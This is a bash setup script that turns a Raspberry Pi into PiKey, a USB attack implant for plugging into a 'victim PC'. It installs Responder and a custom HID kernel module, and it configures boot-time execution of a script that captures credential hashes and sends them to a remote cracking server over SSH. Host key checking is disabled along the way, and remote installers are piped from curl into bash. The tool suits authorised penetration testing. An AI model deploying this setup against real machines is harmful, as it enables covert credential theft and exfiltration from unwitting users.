LEDTYPE=''
USER='pikeyuser'
KEYFILE='/home/pi/.ssh/pikey.pem'

#Write Output
Out () {
	OKC='\033[0;32m'
	WARNC='\033[0;33m'
	ERRC='\033[0;31m'
	NC='\033[0m'

	if [ $1 = "WARN" ]; then
		echo -e "${WARNC}-+${NC} ${2}"
	elif [ $1 = "OK" ]; then
		echo -e "${OKC}++${NC} ${2}"
	elif [ $1 = "ERR" ]; then
		echo -e "${ERRC}--${NC} ${2}"
	fi
}

#To continue or not? That is the question...
Choice () {
	sleep 0.5
	read -p "Do you want to continue? [Y/n] " -n 1 -r
	echo
	if [[ $REPLY =~ ^[Nn]$ ]]; then Out "ERR" "Exiting..."; exit 1; fi
}

#Check wlan0 exists
Out "OK" "Checking for wlan0"
if [ ! -e /sys/class/net/wlan0 ]; then Out "ERR" "wlan0 was not detected, exiting..."; exit 1; fi

#Are we connected to the internet?
Out "OK" "Checking Network Connectivity"
if ! ping -W 1 -c 1 8.8.8.8 &> /dev/null; then Out "ERR" "Not connected to the internet"; exit 1; fi

#Dowload pre-req packages
Out "OK" "Downloading Prerequisites"
sudo apt-get update
sudo apt-get install rpi-update python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools

#Kernel Check
Out "OK" "Checking Kernel"
if ! sudo uname -a | grep -q "4.4.50"; then
	Out "WARN" "Kernel Rollback might be needed (4.4.50) for g_hid.ko to function - script only tested on this version."
	Out "WARN" "Change Kernel to 4.4.50?"		
	Choice
	sudo BRANCH=master rpi-update 5224108
	Out "WARN" "Pi needs to reboot to install Kernel. Reboot and then rerun this script. Reboot now?"	
	Choice
	sudo reboot now	
fi

#LED Choice
ChoiceLED () {
	sleep 0.5
	read -p "What type of LEDs are being used [(N)one, (b)linkt, (s)crollphat] " -n 1 -r
	echo
	if [[ $REPLY =~ ^[Bb]$ ]]; then
		LEDTYPE='blinktimport'
		Out "OK" "Installing Blinkt Libaries (when prompted DO NOT install Python3)"
		curl -sS get.pimoroni.com/blinkt | bash
	elif [[ $REPLY =~ ^[Ss]$ ]]; then
		LEDTYPE='scrollphatimport'
		Out "OK" "Installing ScrollPhat Libaries"
		curl -sS https://get.pimoroni.com/scrollphat | bash
	fi
}

##Configure SSH
Out "OK" "Activating SSH"
sudo touch /boot/ssh

##Create the folder structure we need in the default pi home profile
Out "OK" "Creating Directories"
if [ -e /home/pi/PiKey ]; then
	Out "WARN" "Directory /home/pi/PiKey already exists. Continuing will recreate this directory, removing all files."
	Choice
	sudo rm -rf /home/pi/PiKey
	sudo rm -rf /boot/control
	sudo rm -rf /tmp/PiKey
fi
sudo mkdir /home/pi/PiKey
sudo mkdir /boot/control

##Grab Responder
Out "OK" "Downloading Responder.py"
sudo git clone https://github.com/lgandx/Responder.git /home/pi/PiKey/Responder

##Grab PiKey
Out "OK" "Downloading PiKey"
sudo git clone https://github.com/SecurityJon/PiKey.git /tmp/PiKey/

##Lets move the files to the correct locations
Out "OK" "Moving Files"
sudo mv /tmp/PiKey/client/blinktimport.py /home/pi/PiKey/blinktimport.py && sudo chmod +x /home/pi/PiKey/blinktimport.py
sudo mv /tmp/PiKey/client/scrollphatimport.py /home/pi/PiKey/scrollphatimport.py && sudo chmod +x /home/pi/PiKey/scrollphatimport.py
sudo mv /tmp/PiKey/client/picracking.py /home/pi/PiKey/picracking.py && sudo chmod +x /home/pi/PiKey/picracking.py
sudo mv /tmp/PiKey/client/g_hid.ko /lib/modules/4.4.50+/kernel/drivers/usb/gadget/legacy/g_hid.ko
sudo mv /tmp/PiKey/client/hid-gadget /home/pi/PiKey/hid-gadget && sudo chmod +x /home/pi/PiKey/hid-gadget
sudo mv /tmp/PiKey/client/dhcpd.conf /etc/dhcp/dhcpd.conf
sudo chown -R pi:pi /home/pi

##Configure usb0
Out "OK" "Configuring usb0 Interface"
if sudo grep -q "usb0" /etc/network/interfaces; then
	Out "WARN" "Interface usb0 has already been confgiured in /etc/network/interfaces"
else
	cat /tmp/PiKey/client/usb0-config | sudo tee --append /etc/network/interfaces > /dev/null
fi

#Configure the USB host mode.
Out "OK" "Configuring USB Host Mode"
if sudo grep -q "dtoverlay=dwc2" /boot/config.txt; then
	Out "WARN" "Overlay already set"
else
	echo "dtoverlay=dwc2" | sudo tee --append /boot/config.txt > /dev/null
fi
if sudo grep -q "dwc2" /etc/modules; then
	Out "WARN" "Modules already set"
else
	echo "dwc2" | sudo tee --append /etc/modules > /dev/null
fi

#Grab the infor we need to configure the rc.local
Out "OK" "Configuring rc.local parameters"
ChoiceLED

#Get the SSH IP address
echo "Enter hostname or IP Address of the Remote Cracking Server > "
read IP

#Get the SSH Key
#echo "Paste in the SSH Private Key generated during server install > "
#IFS= read -d '' -n 1 KEY   
#while IFS= read -d '' -n 1 -t 1 c
#do
#    KEY+=$c
#done

#Modify rc.local to contiain the script and values passed.
if sudo grep -q "/home/pi/PiKey/picracking.py" /etc/rc.local; then
	sudo sed -i "/picracking.py/c\\/usr\/bin\/screen -dmSL script bash -c 'python \/home\/pi\/PiKey\/picracking.py $USER $IP $KEYFILE $LEDTYPE'" /etc/rc.local
else
	sudo sed -i '/exit 0/ d' /etc/rc.local
	echo "/usr/bin/screen -dmSL script bash -c 'python /home/pi/PiKey/picracking.py $USER $IP $KEYFILE $LEDTYPE'" | sudo tee --append /etc/rc.local > /dev/null
	echo "exit 0" | sudo tee --append /etc/rc.local > /dev/null
fi

#Configure SSH settings
Out "OK" "Check SSH Settings"
if [ ! -e /home/pi/.ssh ]; then
	mkdir /home/pi/.ssh
fi


#Create SSH key
if [ -e $KEYFILE ]; then
	rm $KEYFILE
fi

echo -e "\n\n\n" | ssh-keygen -t rsa -f $KEYFILE -N "" > /dev/null

#Permissions on key file
sudo chmod 600 $KEYFILE
sudo chown -R pi:pi $KEYFILE

if [ -e /home/pi/.ssh/config ]; then
	mv /home/pi/.ssh/config /home/pi/.ssh/config.pikey
fi
sudo touch /home/pi/.ssh/config

#This bypasses host key checking, trusts remote server.
echo "Host $IP" | sudo tee --append /home/pi/.ssh/config > /dev/null
echo "StrictHostKeyChecking no" | sudo tee --append /home/pi/.ssh/config > /dev/null
echo "UserKnownHostsFile=/dev/null" | sudo tee --append /home/pi/.ssh/config > /dev/null

#Lets also add to root, as this is the context rc.local will be executed under.
if sudo [ ! -e /root/.ssh ]; then
	sudo mkdir /root/.ssh
fi

if sudo [ -e /root/.ssh/config ]; then
	sudo mv /root/.ssh/config /root/.ssh/config.pikey
fi
sudo touch /root/.ssh/config

echo "Host $IP" | sudo tee --append /root/.ssh/config > /dev/null
echo "StrictHostKeyChecking no" | sudo tee --append /root/.ssh/config > /dev/null
echo "UserKnownHostsFile=/dev/null" | sudo tee --append /root/.ssh/config > /dev/null

#Disable DHCP Service
Out "OK" "Disable Jessie Lite DHCP Service"
sudo systemctl disable dhcpcd.service

#Activate Script
Out "OK" "Configuring Script to execute on boot up"
sudo touch /boot/control/responder 

#Tidy Up - remove the tmp files
Out "OK" "Removing tmp Files"
sudo rm -rf /tmp/PiKey

#Print Public Key
Out "OK" "Exporting Public Key. Paste everything between the hashes into the server install script when prompted"
PUBLICKEYEXTENSION=".pub"
PUBLICKEYLOCATION=$KEYFILE$PUBLICKEYEXTENSION
echo "##########################"
cat $PUBLICKEYLOCATION
echo "##########################"

#Reboot
Out "OK" "Installation Complete. You are ready to plug your device into a victim PC - shutdown now?"
Choice
sudo shutdown now
